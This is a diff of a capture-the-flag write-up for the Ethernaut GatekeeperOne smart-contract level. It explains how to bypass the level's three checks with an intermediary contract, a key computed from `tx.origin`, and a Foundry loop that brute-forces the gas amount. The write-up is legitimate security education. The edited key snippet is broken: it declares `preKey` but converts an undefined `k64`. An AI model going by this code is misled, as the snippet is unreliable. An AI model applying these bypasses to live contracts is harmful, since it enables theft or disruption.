@@ -8,64 +8,45 @@ imgSrc: /images/ethernaut/ethernaut13.svg
 
 ## Objectives
 
-1. Get past the three require function modifiers and register as an entrant.
+1. Get past the three `require` function modifiers and register as an entrant.
 
 ## Vulnerabilities
 
-N/A (It's a technical skill test)
+N/A, It's a technical skill test.
 
 ## Exploit
 
-1. Using a contract to interact with the GatekeeperOne contract will satisfy the first `require` since `tx.origin` and `msg.sender` will be different.
+1. Using a contract to interact with the `GatekeeperOne` contract will satisfy the first `require` condition
+   since `tx.origin` and `msg.sender` will be different.
 
-2. The key is based on `tx.origin`. You will need to do multiple casts in a row and rely on bit shifting to find it:
+2. The key is based on `tx.origin`. You will need to do multiple casts in a row and rely on some bit shifting to find it:
 
 ```solidity
-uint16 k16 = uint16(uint160(tx.origin));
-uint64 k64 = uint64(1 << 63) + uint64(k16);
-
+uint64 preKey = uint64(1 << 62) + uint64(uint16(uint160(tx.origin)));
 bytes8 key = bytes8(k64);
 ```
 
 3. Finding the correct gas amount is quite tricky. It will vary based on which compiler version you are using among other things. Testing
-   all gas amounts using foundy until it works is a good way to do it.
+   all possible gas amounts using foundry until it works is a good way to do it.
 
 ```solidity
-pragma solidity ^0.8;
-
-import "forge-std/Test.sol";
-import "forge-std/console.sol";
-
-import "src/GatekeeperOne.sol";
-
-contract TestGateKeeperOne is Test {
-    IGateKeeperOne private target;
-    // GatekeeperOne private target;
-    Hack private hack;
-
-    function setUp() public {
-        target = IGateKeeperOne(0xCe78C5830b7c69129723E21f58e5c24e25Ded7a2);
-        // target = new GatekeeperOne();
-        hack = new Hack();
+function test() public {
+    for (uint256 i = 100; i < 8191; i++) {
+        try hack.enter(address(target), i) {
+            console.log("gas", i);
+            return;
+        } catch {}
     }
-
-    function test() public {
-        for (uint256 i = 100; i < 8191; i++) {
-            try hack.enter(address(target), i) {
-                console.log("gas", i);
-                return;
-            } catch {}
-        }
-        revert("all failed");
-    }
+    revert("all failed");
 }
 ```
 
-4. Once you have the correct gas aount, call `enter` with with gas.
+4. Once you have the correct gas amount, call `enter` with with gas. I ended up needing `256 + 3 * 8191` gas. I tried with `256 + 2 * 8191` and
+   `256 + 8191` but it didn't work for some reason. It might be related to the amount of gas needed to complete the rest of the transaction.
 
 ## Suggested mitigation
 
-N/A (It's a technical skill test)
+N/A, It's a technical skill test.
 
 ## Further reading
 
